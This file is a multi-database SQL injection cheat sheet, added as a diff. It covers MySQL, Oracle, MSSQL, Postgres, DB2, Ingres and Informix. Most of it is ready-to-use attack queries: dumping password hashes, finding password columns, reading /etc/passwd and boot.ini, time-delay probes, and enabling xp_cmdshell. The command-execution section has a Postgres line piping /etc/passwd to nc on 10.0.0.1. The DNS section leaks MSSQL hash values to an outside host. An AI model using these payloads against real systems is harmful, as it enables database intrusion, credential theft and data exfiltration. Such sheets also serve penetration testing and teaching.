@@ -1,0 +1,409 @@
+SQL Injection
+
+VERSION:
+(MySQL) SELECT @@version
+(ORACLE)SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’; 
+(ORACLE)SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’; 
+(MSSQL)SELECT version FROM v$instance; (ORACLE)
+(MSSQL)SELECT @@version
+(POSTGRESQL)SELECT version()
+(INGRES)select dbmsinfo(‘_version’);
+(DB2)select versionnumber, version_timestamp from sysibm.sysversions;
+(INFORMIX)SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1;
+(INFORMIX)SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1;
+(INFORMIX)SELECT DBINFO(‘version’, ‘major’), DBINFO(‘version’, ‘minor’), DBINFO(‘version’, ‘level’) FROM systables WHERE tabid = 1;
+(INFORMIX)SELECT DBINFO(‘version’, ‘os’) FROM systables WHERE tabid = 1; — T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix
+
+
+
+COMMENTS:
+(MySQL) SELECT 1; #comment 
+(MySQL)SELECT /*comment*/1; 
+(ORACLE)SELECT 1 FROM dual — comment 
+(MSSQL)SELECT 1 — comment
+(MSSQL)SELECT /*comment*/1
+(Postgres)SELECT 1; –comment
+(Postgres)SELECT /*comment*/1;
+(INGRES)SELECT 123; — comment
+(INGRES)select 123; /* comment */
+(DB2)select blah from foo; — comment like this
+(INFORMIX)select 1 FROM systables WHERE tabid = 1; — comment
+
+
+
+CURRENT USER:
+(MySQL)SELECT user(); 
+(MySQL)SELECT system_user(); 
+(ORACLE)SELECT user FROM dual 
+(MSSQL)SELECT user_name();
+(MSSQL)SELECT system_user;
+(MSSQL)SELECT user;
+(MSSQL)SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
+(Postgres)SELECT user;
+(Postgres)SELECT current_user;
+(Postgres)SELECT session_user;
+(Postgres)SELECT usename FROM pg_user;
+(Postgres)SELECT getpgusername();
+(INGRES)select dbmsinfo(‘session_user’);
+(INGRES)select dbmsinfo(‘system_user’);
+(DB2)select user from sysibm.sysdummy1;
+(DB2)select session_user from sysibm.sysdummy1;
+(DB2)select system_user from sysibm.sysdummy1;
+(INFORMIX)SELECT USER FROM systables WHERE tabid = 1;
+(INFORMIX)select CURRENT_ROLE FROM systables WHERE tabid = 1;
+
+LIST USERS:
+(MySQL)SELECT user FROM mysql.user; — priv 
+(ORACLE)SELECT username FROM all_users ORDER BY username; 
+(ORACLE)SELECT name FROM sys.user$; — priv 
+(MSSQL)SELECT name FROM master..syslogins
+(Postgres)SELECT usename FROM pg_user
+(INGRES)First connect to iidbdb, then:
+(INGRES)SELECT name, password FROM iiuser; — or
+(INGRES)SELECT own FROM iidatabase;
+(INFORMIX)select username, usertype, password from sysusers;
+
+
+
+LIST PASSWORD HASHES:
+(MySQL)SELECT host, user, password FROM mysql.user; — priv 
+(ORACLE)SELECT name, password, astatus FROM sys.user$ — priv, <= 10g.  astatus tells you if acct is locked 
+(ORACLE)SELECT name,spare4 FROM sys.user$ — priv, 11g 
+(MSSQL)SELECT name, password FROM master..sysxlogins — priv, mssql 2000;
+(MSSQL)SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
+(MSSQL)SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;
+(MSSQL)SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005
+(Postgres)SELECT usename, passwd FROM pg_shadow — priv
+(INGRES)First connect to iidbdb, then:
+(INGRES)select name, password from iiuser;
+
+LIST PRIVILEGES:
+(MySQL)SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privs 
+(MySQL)SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privs 
+(MySQL)SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas) 
+(MySQL)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns 
+(ORACLE)SELECT * FROM session_privs; — current privs 
+(ORACLE)SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs 
+(ORACLE)SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv 
+(ORACLE)SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; 
+(MSSQL)SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database
+(MSSQL)SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server
+(MSSQL)SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table
+(MSSQL)SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
+–permissions on a user– current privs in 2005, 2008
+(MSSQL)SELECT is_srvrolemember(‘sysadmin’);
+(MSSQL)SELECT is_srvrolemember(‘dbcreator’);
+(MSSQL)SELECT is_srvrolemember(‘bulkadmin’);
+(MSSQL)SELECT is_srvrolemember(‘diskadmin’);
+(MSSQL)SELECT is_srvrolemember(‘processadmin’);
+(MSSQL)SELECT is_srvrolemember(‘serveradmin’);
+(MSSQL)SELECT is_srvrolemember(‘setupadmin’);
+(MSSQL)SELECT is_srvrolemember(‘securityadmin’);
+– who has a particular priv? 2005, 2008
+(MSSQL)SELECT name FROM master..syslogins WHERE denylogin = 0;
+(MSSQL)SELECT name FROM master..syslogins WHERE hasaccess = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE isntname = 0;
+(MSSQL)SELECT name FROM master..syslogins WHERE isntgroup = 0;
+(MSSQL)SELECT name FROM master..syslogins WHERE sysadmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE securityadmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE serveradmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE setupadmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE processadmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE diskadmin = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE dbcreator = 1;
+(MSSQL)SELECT name FROM master..syslogins WHERE bulkadmin = 1;
+(Postgres)SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+(INGRES)select dbmsinfo(‘db_admin’);
+(INGRES)select dbmsinfo(‘create_table’);
+(INGRES)select dbmsinfo(‘create_procedure’);
+(INGRES)select dbmsinfo(‘security_priv’);
+(INGRES)select dbmsinfo(‘select_syscat’);
+(INGRES)select dbmsinfo(‘db_privileges’);
+(INGRES)select dbmsinfo(‘current_priv_mask’);
+(DB2)select * from syscat.tabauth; — privs on tables
+(DB2)select * from syscat.dbauth where grantee = current user;
+(DB2)select * from syscat.tabauth where grantee = current user;
+(DB2)select * from SYSIBM.SYSUSERAUTH – List db2 system privilegies
+(INFORMIX)select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; — which tables are accessible by which users
+(INFORMIX)select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid; — which procedures are accessible by which users
+
+ 
+LIST DBA ACCOUNTS:
+(MySQL)SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv
+(ORACLE)SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles 
+(MSSQL)SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation
+(MSSQL)SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
+(MSSQL)SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005
+(Postgres)SELECT usename FROM pg_user WHERE usesuper IS TRUE
+(DB2)select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
+
+
+CURRENT DATABASE:
+(MySQL)SELECT database() 
+(ORACLE)SELECT global_name FROM global_name; 
+(ORACLE)SELECT name FROM v$database; 
+(ORACLE)SELECT instance_name FROM v$instance; 
+(ORACLE)SELECT SYS.DATABASE_NAME FROM DUAL; 
+(MSSQL)SELECT DB_NAME()
+(Postgres)SELECT current_database()
+(INGRES)select dbmsinfo(‘database’);
+(DB2)select current server from sysibm.sysdummy1;
+(INFORMIX)SELECT DBSERVERNAME FROM systables where tabid = 1; — server name
+
+
+
+
+ 
+LIST DATABASES:
+(MySQL)SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0 
+(MySQL)SELECT distinct(db) FROM mysql.db — priv 
+(ORACLE)SELECT DISTINCT owner FROM all_tables; — list schemas (one per user) 
+(MSSQL)SELECT name FROM master..sysdatabases;
+(MSSQL)SELECT DB_NAME(N); — for N = 0, 1, 2, …
+(Postgres)SELECT datname FROM pg_database
+(INGRES)SELECT name FROM iidatabase; — connect to iidbdb
+(DB2)SELECT schemaname FROM syscat.schemata;
+(INFORMIX)select name, owner from sysdatabases;
+
+
+
+
+
+LIST COLUMNS:
+(MySQL)SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ 
+(ORACLE)SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’; 
+(ORACLE)SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’; 
+(MSSQL)SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
+(MSSQL)SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+(Postgres)SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)
+(INGRES)select column_name, column_datatype, table_name, table_owner from iicolumns;
+(DB2)select name, tbname, coltype from sysibm.syscolumns;
+(INFORMIX)select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;
+
+
+
+
+LIST TABLES:
+(MySQL)SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ 
+(ORACLE)SELECT table_name FROM all_tables; 
+(ORACLE)SELECT owner, table_name FROM all_tables; 
+(MSSQL)SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
+(MSSQL)SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
+(MSSQL)SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+(Postgres)SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)
+(INGRES)select table_name, table_owner from iitables;
+(INGRES)select relid, relowner, relloc from iirelation;
+(INGRES)select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;
+(DB2)select name from sysibm.systables;
+(INFORMIX)select tabname, owner FROM systables;
+(INFORMIX)select tabname, viewtext FROM sysviews  join systables on systables.tabid = sysviews.tabid;
+
+
+ 
+FIND TABLES FROM COLUMN NAME:
+(MySQL)SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
+(ORACLE)SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
+(Postgres)If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;
+(INGRES)SELECT table_name, table_owner FROM iicolumns WHERE column_name = ‘value’
+(DB2)select tbname from sysibm.syscolumns where name=’username’
+(INFORMIX)select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid where colname like ‘%pass%’;
+
+
+
+SELECT Nth ROW:
+(MySQL)SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0 
+(MySQL)SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0 
+(ORACLE)SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; 
+(MSSQL)SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row
+(Postgres)SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; — rows numbered from 0
+(Postgres)SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;
+(DB2)select name from (SELECT name FROM sysibm.systables order by
+(DB2)name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;
+(INFORMIX)select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc; — selects the 10th row
+
+
+SELECT Nth CHAR:
+(MySQL)SELECT substr(‘abcd’, 3, 1); # returns c 
+(ORACLE)SELECT substr(‘abcd’, 3, 1) FROM dual; 
+(MSSQL)SELECT substring(‘abcd’, 3, 1) — returns c
+(Postgres)SELECT substr(‘abcd’, 3, 1); — returns c
+(INGRES)select substr(‘abc’, 2, 1); — returns ‘b’
+(DB2)SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1;  — returns b
+(INFORMIX)SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where tabid = 1; — returns ‘C’
+
+
+
+
+BITWISE AND:
+(MySQL)SELECT 6 & 2; # returns 2 
+(MySQL)SELECT 6 & 1; # returns 0 
+(ORACLE)SELECT bitand(6,2) FROM dual; — returns 2 
+(ORACLE)SELECT bitand(6,1) FROM dual; — returns0 
+(MSSQL)SELECT 6 & 2 — returns 2
+(MSSQL)SELECT 6 & 1 — returns 0
+(Postgres)SELECT 6 & 2; — returns 2
+(Postgres)SELECT 6 & 1; –returns 0
+(INFORMIX)select bitand(6, 1) from systables where tabid = 1; — returns 0
+(INFORMIX)select bitand(6, 2) from systables where tabid = 1; — returns 2
+
+ASCII VALUE --> CHAR:
+(MySQL)SELECT char(65); # returns A 
+(ORACLE)SELECT chr(65) FROM dual; — returns A 
+(MSSQL)SELECT char(0×41) — returns A
+(Postgres)SELECT chr(65);
+(DB2)select chr(65) from sysibm.sysdummy1; — returns ‘A’
+
+
+
+CHAR --> ASCII VALUE:
+(MySQL)SELECT ascii(‘A’); # returns 65 
+(ORACLE)SELECT ascii(‘A’) FROM dual; — returns 65 
+(MSSQL)SELECT ascii(‘A’) – returns 65
+(Postgres)SELECT ascii(‘A’);
+(DB2)select ascii(‘A’) from sysibm.sysdummy1; — returns 65
+(INFORMIX)select ascii(‘A’) from systables where tabid = 1;
+
+
+
+
+CASTING:
+(MySQL)SELECT cast(’1′ AS unsigned integer); 
+(MySQL)SELECT cast(’123′ AS char); 
+(ORACLE)SELECT CAST(1 AS char) FROM dual; 
+(ORACLE)SELECT CAST(’1′ AS int) FROM dual; 
+(MSSQL)SELECT CAST(’1′ as int);
+(MSSQL)SELECT CAST(1 as char)
+(Postgres)SELECT CAST(1 as varchar);
+(Postgres)SELECT CAST(’1′ as int);
+(INGRES)select cast(123 as varchar);
+(INGRES)select cast(’123′ as integer);
+(DB2)SELECT cast(’123′ as integer) FROM sysibm.sysdummy1;
+(DB2)SELECT cast(1 as char) FROM sysibm.sysdummy1;
+(INFORMIX)select cast(’123′ as integer) from systables where tabid = 1;
+(INFORMIX)select cast(1 as char) from systables where tabid = 1;
+ 
+STRING CONCATENATION:
+(MySQL)SELECT CONCAT(‘A’,'B’); #returns AB 
+(MySQL)SELECT CONCAT(‘A’,'B’,'C’); # returns ABC 
+(ORACLE)SELECT ‘A’ || ‘B’ FROM dual; — returns AB 
+(MSSQL)SELECT ‘A’ + ‘B’ – returns AB
+(Postgres)SELECT ‘A’ || ‘B’; — returnsAB
+(INGRES)select ‘abc’ || ‘def’;
+(DB2)SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1; — returns ‘abc’
+(DB2)select ‘a’ || ‘b’ from sysibm.sysdummy1; — returns ‘ab’
+(INFORMIX)SELECT ‘A’ || ‘B’ FROM systables where tabid = 1; — returns ‘AB’
+(INFORMIX)SELECT concat(‘A’, ‘B’) FROM systables where tabid = 1; — returns ‘AB’
+
+
+
+
+IF STATEMENT:
+(MySQL)SELECT if(1=1,’foo’,'bar’); — returns ‘foo’ 
+(ORACLE)BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements 
+(MSSQL)IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1
+
+
+CASE STATEMENT:
+(MySQL)SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A
+(ORACLE)SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1 
+(ORACLE)SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2 
+(MSSQL)SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1
+(Postgres)SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A
+(INFORMIX)select tabid, case when tabid>10 then “High” else ‘Low’ end from systables;
+
+
+
+
+AVOIDING QUOTES:
+(MySQL)SELECT 0×414243; # returns ABC 
+(ORACLE)SELECT chr(65) || chr(66) FROM dual; — returns AB 
+(MSSQL)SELECT char(65)+char(66) — returns AB
+(Postgres)SELECT CHR(65)||CHR(66); — returns AB
+
+
+
+TIME DELAY:
+(MySQL)SELECT BENCHMARK(1000000,MD5(‘A’)); 
+(MySQL)SELECT SLEEP(5); # >= 5.0.12 
+(ORACLE)BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT 
+(ORACLE)SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow 
+(ORACLE)SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow 
+(ORACLE)SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow 
+(MSSQL)WAITFOR DELAY ’0:0:5′ — pause for 5 seconds
+(Postgres)SELECT pg_sleep(10); — postgres 8.2+ only
+(Postgres)CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function.  Taken from here .
+
+ 
+LOCAL FILE ACCESS:
+(MySQL)…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files. 
+(MySQL)SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system 
+(ORACLE)UTL_FILE can sometimes be used.  Check that the following is non-null: 
+(ORACLE)SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;Java can be used to read and write files if it’s installed (it is not available in Oracle Express). 
+(MSSQL)CREATE TABLE mydata (line varchar(8000));
+(MSSQL)BULK INSERT mydata FROM ‘c:boot.ini’;
+(MSSQL)DROP TABLE mydata;
+
+MAKE DNS REQUESTS:
+(ORACLE)SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual; 
+(ORACLE)SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; 
+(MSSQL)declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
+(Postgres)SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);
+
+COMMAND EXECUTION:
+(MSSQL)EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+(MSSQL)EXEC sp_configure ‘show advanced options’, 1; — priv
+(MSSQL)RECONFIGURE; — priv
+(MSSQL)EXEC sp_configure ‘xp_cmdshell’, 1; — priv
+(MSSQL)RECONFIGURE; — priv
+(Postgres)CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user
+
+HOSTNAME, IP ADDRESS:
+(MySQL)SELECT @@hostname; 
+(ORACLE)SELECT UTL_INADDR.get_host_name FROM dual; 
+(ORACLE)SELECT host_name FROM v$instance; 
+(ORACLE)SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address 
+(ORACLE)SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames 
+(MSSQL)SELECT HOST_NAME()
+(Postgres)SELECT inet_server_addr(); — returns db server IP address (or null if using local connection)
+(Postgres)SELECT inet_server_port(); — returns db server IP address (or null if using local connection)
+(INGRES)SELECT dbmsinfo(‘ima_server’)
+(INFORMIX)SELECT DBINFO(‘dbhostname’) FROM systables WHERE tabid = 1; — hostname
+
+
+
+
+CREATE USERS:
+(MySQL)CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv 
+(MSSQL)EXEC sp_addlogin ‘user’, ‘pass’; — priv
+(Postgres)CREATE USER test1 PASSWORD ‘pass1′; — priv
+(Postgres)CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER; — priv, grant some privs at the same time
+
+ 
+DELETE USERS:
+(MySQL)DROP USER test1; — priv 
+(MSSQL)EXEC sp_droplogin ‘user’; — priv
+(Postgres)DROP USER test1; — priv
+
+
+MAKE USER DBA:
+(MySQL)GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv 
+(MSSQL)EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin; — priv
+(Postgres)ALTER USER test1 CREATEUSER CREATEDB; — priv
+
+
+
+LOCATION OF DB FILES:
+(MySQL)SELECT @@datadir; 
+(ORACLE)SELECT name FROM V$DATAFILE; 
+(MSSQL)EXEC sp_helpdb master; –location of master.mdf
+(MSSQL)EXEC sp_helpdb pubs; –location of pubs.mdf
+(Postgres)SELECT current_setting(‘data_directory’); — priv
+(Postgres)SELECT current_setting(‘hba_file’); — priv
+(INGRES)SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE name = ‘value’ — primary location of db
+(INGRES)SELECT lname FROM iiextend WHERE dname = ‘value’ — extended location of db
+(INGRES)SELECT are FROM iilocations where lname = ‘value’ – all area (ie directory) linked with a location
+
+DEFAULT/SYSTEM DATABASES: 
+(MySQL)information_schema (>= mysql 5.0) / mysql 
+(ORACLE)SYSTEM / SYSAUX 
+(INGRES)SELECT name FROM iidatabase WHERE own = ‘$ingres’ — connect to iidbdb
